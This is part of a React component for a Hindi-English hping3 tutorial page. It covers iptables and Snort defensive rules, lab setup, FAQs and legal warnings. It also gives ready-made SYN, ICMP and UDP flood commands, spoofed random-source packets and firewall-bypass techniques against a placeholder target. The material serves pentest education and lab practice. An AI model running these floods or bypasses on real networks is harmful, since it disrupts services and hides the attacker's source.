      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">SYN Cookies:</strong> SYN flood protection — Linux: echo 1 &gt; /proc/sys/net/ipv4/tcp_syncookies। यह stateless SYN handling use करता है जिससे memory exhaustion नहीं होती</li>
        <li><strong className="text-white">Rate Limiting:</strong> iptables से packet rate limit करो: iptables -A INPUT -p tcp --syn -m limit --limit 100/s --limit-burst 200 -j ACCEPT</li>
        <li><strong className="text-white">Stateful Firewall:</strong> Stateful inspection enable करो — fragmented packets और invalid flag combinations block होंगे। iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT</li>
        <li><strong className="text-white">IDS/IPS:</strong> Snort/Suricata से flood patterns detect करो। Snort rule: alert tcp any any -> $HOME_NET any (flags:S; threshold: type both, track by_src, count 50, seconds 10;)</li>
        <li><strong className="text-white">Connection Tracking:</strong> conntrack से suspicious connections monitor करो: conntrack -E -p tcp। Unusual connection patterns detect करो</li>
        <li><strong className="text-white">Anti-Spoofing:</strong> Reverse path filtering enable करो: net.ipv4.conf.all.rp_filter = 1। Spoofed source IPs automatically reject होंगे</li>
        <li><strong className="text-white">TCP Flags Validation:</strong> Invalid flag combinations block करो: iptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP (NULL scan block)</li>
        <li><strong className="text-white">GeoIP Blocking:</strong> Unnecessary countries से traffic block करो — attack surface reduce होता है</li>
        <li><strong className="text-white">Network Segmentation:</strong> Critical systems को separate network segment में रखो — blast radius limited रहता है</li>
      </ul>
      <CodeBlock
        title="iptables Defense Rules"
        code={`# SYN flood protection:
iptables -A INPUT -p tcp --syn -m limit --limit 50/s --limit-burst 100 -j ACCEPT
iptables -A INPUT -p tcp --syn -j DROP

# Invalid TCP flags block:
iptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP
iptables -A INPUT -p tcp --tcp-flags ALL ALL -j DROP
iptables -A INPUT -p tcp --tcp-flags ALL FIN,URG,PSH -j DROP
iptables -A INPUT -p tcp --tcp-flags ALL SYN,RST,ACK,FIN,URG -j DROP
iptables -A INPUT -p tcp --tcp-flags SYN,RST SYN,RST -j DROP
iptables -A INPUT -p tcp --tcp-flags SYN,FIN SYN,FIN -j DROP

# Fragmented packets block:
iptables -A INPUT -f -j DROP

# ICMP rate limit:
iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/s --limit-burst 4 -j ACCEPT
iptables -A INPUT -p icmp --icmp-type echo-request -j DROP

# Logging:
iptables -A INPUT -p tcp --dport 80 -j LOG --log-prefix "HTTP_SCAN: " --log-level 4`}
      />

      <h2>Lab Environment Setup</h2>
      <p>
        hping3 practice करने के लिए safe lab environment बनाना ज़रूरी है। कभी भी production network पर test मत करो — unexpected results आ सकते हैं। Virtual machines use करो और isolated network setup करो।
      </p>
      <CodeBlock
        title="VirtualBox Lab Setup"
        code={`# Step 1: VirtualBox install करो
sudo apt install virtualbox

# Step 2: दो VMs बनाओ:
# VM 1: Kali Linux (attacker)
# VM 2: Metasploitable2 (target)

# Step 3: Network configure करो
# दोनों VMs में Host-Only Adapter set करो
# VirtualBox → Settings → Network → Host-Only Adapter

# Step 4: IP verify करो
# Kali: ip addr show (e.g., 192.168.56.101)
# Metasploitable: ifconfig (e.g., 192.168.56.102)

# Step 5: Connectivity test:
ping 192.168.56.102

# Step 6: hping3 basic test:
sudo hping3 -S -c 3 -p 80 192.168.56.102`}
      />
      <CodeBlock
        title="Docker-based Lab"
        code={`# Docker से quick lab:
docker run -d --name target -p 80:80 vulnerables/web-dvwa
docker run -d --name metasploitable -p 22:22 -p 8080:80 tleemcjr/metasploitable2

# hping3 test:
sudo hping3 -S -c 5 -p 80 127.0.0.1
sudo hping3 -S -c 5 -p 22 127.0.0.1

# Network namespace lab:
sudo ip netns add attacker
sudo ip netns add target
sudo ip link add veth0 type veth peer name veth1
sudo ip link set veth0 netns attacker
sudo ip link set veth1 netns target
# Configure IPs and test`}
      />
      <p>
        Lab setup के बाद systematically सब tests करो। हर test case document करो — command, output, observation। यह pentesting report writing की practice भी है। Real engagement में यह documentation client को deliver होती है।
      </p>

      <h2>Advanced Techniques</h2>
      <CodeBlock
        title="Advanced Packet Crafting"
        code={`# Fragmented packets (firewall bypass):
sudo hping3 -S -p 80 -f target_ip

# Custom data payload:
sudo hping3 -S -p 80 -d 100 target_ip

# Spoofed source IP:
sudo hping3 -S -p 80 --spoof 192.168.1.200 target_ip

# Random source IP (anti-trace):
sudo hping3 -S --rand-source -p 80 target_ip

# Custom TTL:
sudo hping3 -S -p 80 --ttl 128 target_ip

# Custom window size:
sudo hping3 -S -p 80 -W 65535 target_ip

# Bad checksum (stateful firewall test):
sudo hping3 -S -p 80 --badcksum target_ip

# Multiple packets with interval:
sudo hping3 -S -c 100 -p 80 -i u10000 target_ip
# u10000 = 10ms delay between packets`}
      />
      <CodeBlock
        title="Firewall Bypass Techniques"
        code={`# Technique 1: Source port 53 (DNS trust):
sudo hping3 -S -s 53 -p 80 target_ip

# Technique 2: Fragmented packets:
sudo hping3 -S -f -p 80 target_ip

# Technique 3: ACK scan (bypass stateless rules):
sudo hping3 -A -p 80 target_ip

# Technique 4: Window size manipulation:
sudo hping3 -S -p 80 -W 1024 target_ip
sudo hping3 -S -p 80 -W 65535 target_ip

# Technique 5: TTL manipulation:
sudo hping3 -S -p 80 --ttl 1 target_ip
# Hop count analysis

# Technique 6: Multiple flags combination:
sudo hping3 -S -A -P -U -p 80 target_ip
# Unusual flag combination — some firewalls ignore

# Technique 7: Invalid checksum:
sudo hping3 -S -p 80 --badcksum target_ip
# Stateful vs stateless firewall detect`}
      />
      <CodeBlock
        title="Network Stress Testing"
        code={`# SYN flood (apne server पर test):
sudo hping3 -S --flood -p 80 target_ip

# SYN flood with random source:
sudo hping3 -S --rand-source --flood -p 80 target_ip

# ICMP flood:
sudo hping3 -1 --flood target_ip

# UDP flood:
sudo hping3 --udp --flood -p 53 target_ip

# Rate-limited flood:
sudo hping3 -S --flood -p 80 --interval u1000 target_ip

# Count-limited flood:
sudo hping3 -S --flood -c 10000 -p 80 target_ip

# Monitor connections (alag terminal):
watch -n 1 "netstat -an | grep :80 | wc -l"

# Monitor with ss:
watch -n 1 "ss -s"

# SYN cookies test:
# Before: echo 0 > /proc/sys/net/ipv4/tcp_syncookies
# During flood: server connection drops
# After: echo 1 > /proc/sys/net/ipv4/tcp_syncookies
# Server stable हो जाना चाहिए`}
      />

      <h2>Frequently Asked Questions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'hping3 और Nmap में क्या फ़र्क है?', a: 'hping3 packet crafting tool है — individual packets control कर सकते हो। Nmap scanning tool है — comprehensive scan करता है service detection, OS detection के साथ। Firewall testing के लिए hping3, general scanning के लिए Nmap use करो।' },
          { q: 'क्या hping3 DDoS attack कर सकता है?', a: 'hping3 में flood mode है लेकिन सिर्फ authorized testing के लिए। DDoS attack करना illegal है। अपने servers पर stress testing करो।' },
          { q: 'Windows पर चलता है?', a: 'नहीं, सिर्फ Linux/Unix। Windows पर hping2 try करो या Kali VM use करो।' },
          { q: 'Root access ज़रूरी है?', a: 'हाँ, raw sockets के लिए root चाहिए। sudo लगाओ या CAP_NET_RAW capability set करो।' },
          { q: 'Scapy से बेहतर है?', a: 'अलग tools हैं। hping3 quick CLI-based testing के लिए best है। Scapy complex protocols और custom packet crafting के लिए best है (Python scripting)।' },
          { q: 'Fragmented packets क्यों use करें?', a: 'कुछ firewalls fragmented packets properly handle नहीं करते। Fragmented packets भेजकर test कर सकते हो कि firewall bypass होता है या नहीं।' },
          { q: 'hping3 कितना fast packets भेज सकता है?', a: 'Network bandwidth और system resources पर depend करता है। Default mode: ~100 packets/sec। --flood mode: thousands/sec। --interval u100 से 10,000+ packets/sec possible है।' },
          { q: 'क्या hping3 IPv6 support करता है?', a: 'नहीं, hping3 सिर्फ IPv4 support करता है। IPv6 testing के लिए Scapy या nping6 use करो।' },
          { q: 'hping3 vs nping कौन सा better है?', a: 'hping3 packet crafting के लिए better (Tcl scripting, flood mode)। nping Nmap ecosystem का part है — Nmap साथ integrate होता है। Quick testing: hping3। Nmap workflow: nping।' },
          { q: 'Custom data payload कैसे add करें?', a: '-d flag से data size specify करो। Default payload random data होता है। Custom payload के लिए --file flag use करो: --file payload.bin' },
          { q: 'hping3 से network speed test कर सकते हैं?', a: 'नहीं, hping3 speed test tool नहीं है। iperf3 ya speedtest-cli use करो। hping3 packet-level network testing के लिए है — latency, packet loss, firewall rules।' },
          { q: 'hping3 से DNS query test कर सकते हैं?', a: 'हाँ, UDP mode से: sudo hping3 -2 -p 53 target_ip। लेकिन actual DNS query नहीं भेजता — सिर्फ UDP port 53 पर packets भेजता है। Full DNS testing के लिए dig या nslookup use करो।' },
          { q: 'hping3 का output कैसे parse करें?', a: 'grep use करो: sudo hping3 -S -c 1 -p 80 target_ip 2>&1 | grep "flags"। SA = open, RA = closed, no response = filtered। awk से specific fields extract कर सकते हो।' },
          { q: 'hping3 से VLAN hopping test कर सकते हैं?', a: 'नहीं, hping3 layer 3/4 tool है। VLAN hopping layer 2 attack है — yersinia या scapy use करो। hping3 सिर्फ IP-level packets बना सकता है।' },
          { q: 'hping3 mobile (Android) पर चलता है?', a: 'हाँ, Termux/Nethunter में चलता है। pkg install hping (Termux) या apt install hping3 (Nethunter)। Root access ज़रूरी है raw sockets के लिए।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Legal and Ethical Considerations</h2>
      <p>
        hping3 powerful packet crafting tool है — इसका use legal boundaries के अंदर करना ज़रूरी है। Unauthorized network testing illegal है और serious legal consequences हो सकते हैं। हमेशा written permission लो test करने से पहले।
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">Written Authorization:</strong> बिना permission test करना illegal है — CFAA (US), IT Act (India) के under criminal charges हो सकते हैं</li>
        <li><strong className="text-white">Scope Define करो:</strong> Test scope clearly define करो — कौन से IPs, कौन से ports, कितना traffic</li>
        <li><strong className="text-white">Production Network Avoid:</strong> कभी production network पर flood testing मत करो — service disruption हो सकती है</li>
        <li><strong className="text-white">Lab Environment:</strong> Virtual machines और isolated networks पर practice करो — safe environment</li>
        <li><strong className="text-white">Document Everything:</strong> सब tests document करो — command, time, result, authorization reference</li>
        <li><strong className="text-white">Responsible Disclosure:</strong> अगर vulnerability मिले तो responsible disclosure follow करो — तुरंत public मत करो</li>
        <li><strong className="text-white">Professional Ethics:</strong> Security professional के रूप में ethical conduct maintain करो — trust बनाओ</li>
      </ul>

      <h2>Alternatives</h2>
      <p>
        Packet crafting aur network testing के लिए कई alternatives available हैं। हर tool different use case के लिए better है।
      </p>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">टूल</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">खासियत</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Nmap</td><td className="py-2 px-3">Network scanner</td><td className="py-2 px-3">Comprehensive — service, OS detection, scripting</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Scapy</td><td className="py-2 px-3">Python packet crafting</td><td className="py-2 px-3">Full control, custom protocols, automation</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">nping</td><td className="py-2 px-3">Nmap packet tool</td><td className="py-2 px-3">Nmap integration, cleaner output, echo mode</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">packETH</td><td className="py-2 px-3">GUI packet builder</td><td className="py-2 px-3">Visual interface, drag-drop, hex editing</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">ostinato</td><td className="py-2 px-3">Traffic generator</td><td className="py-2 px-3">GUI, traffic streams, statistics, multi-protocol</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">nemesis</td><td className="py-2 px-3">CLI packet crafting</td><td className="py-2 px-3">Simple, lightweight, scriptable</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">packit</td><td className="py-2 px-3">Network audit tool</td><td className="py-2 px-3">Packet injection, capture, analysis</td></tr>
          </tbody>
        </table>
      </div>

      <div className="info-box mt-6">
        <strong>💡 Pro Tips:</strong>
        <ul className="list-disc list-inside text-gray-300 mt-2 space-y-1">
          <li>Firewall testing के लिए hping3 best tool है — alag-alag TCP flags भेजकर behavior analyze करो</li>
          <li>SYN block हो रहा है तो ACK try करो — कुछ firewalls ACK packets allow करते हैं</li>
          <li>Source port 53 (DNS) से packets भेजो — कुछ firewalls DNS traffic trust करते हैं</li>
          <li>Fragmented packets से stateless firewall bypass test करो (-f flag)</li>
          <li>--rand-source से anti-trace testing करो — source IP hide होता है</li>
          <li>-V (verbose) mode हमेशा use करो — response details दिखते हैं</li>
          <li>TTL check से OS detect करो: Linux=64, Windows=128, Network=255</li>
          <li>Count (-c) हमेशा set करो — वरना infinite loop में फँस सकते हो</li>
          <li>Nmap से scan करो पहले, फिर hping3 से specific ports deep test करो</li>
          <li>Tcl scripting से automated firewall audit scripts बनाओ — repeatable testing</li>
          <li>Response time analysis से network latency issues identify करो — -i u100000 use करो</li>
          <li>Multiple terminals में parallel scanning करो — different ports एक साथ test होंगे</li>
          <li>tcpdump साथ में run करो — raw packet capture detailed analysis के लिए</li>
          <li>Production network पर कभी --flood mode मत use करो — service disruption हो सकती है</li>
          <li>Pentest report में hping3 output include करो — evidence के लिए screenshots लो</li>
          <li>Practice lab में पहले test करो, फिर production पर — accidentally DoS होने से बचोगे</li>
          <li>Custom Tcl scripts बनाओ repeatable tests के लिए — manual testing time-consuming है</li>
          <li>Wireshark साथ में open रखो — packet structure visually analyze होगी</li>
          <li>iptables rules test करने के लिए hping3 best है — before/after comparison करो</li>
          <li>Network documentation maintain करो — हर test का result record करो</li>
          <li>Certification prep (CEH, OSCP) में hping3 important tool है — practice ज़रूर करो</li>
          <li>Scapy सीखो advanced packet crafting के लिए — hping3 से ज़्यादा flexible है</li>
          <li>Response analysis में window size values note करो — OS fingerprinting में काम आते हैं</li>
          <li>Flood testing से पहले monitoring setup करो — server metrics capture होने चाहिए</li>
          <li>Legal authorization document हमेशा साथ रखो — pentest engagement letter</li>
          <li>Network diagrams बनाओ test results से — client presentation के लिए useful</li>
          <li>Continuous learning: SANS, Offensive Security courses में packet crafting cover होता है</li>
          <li>Community forums join करो — new techniques और use cases share होते हैं</li>
        </ul>
      </div>

      <div className="warning-box mt-6">
        <strong>⚠️ फाइनल वार्निंग:</strong> hping3 packet flooding और DoS testing सिर्फ अपने infrastructure पर करो। बिना permission के network attack illegal है। Corporate networks पर unauthorized testing job loss या legal action का कारण बन सकता है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत unauthorized network attacks अपराध है। सब कुछ document करो।
      </div>
    </TutorialLayout>
  )
}
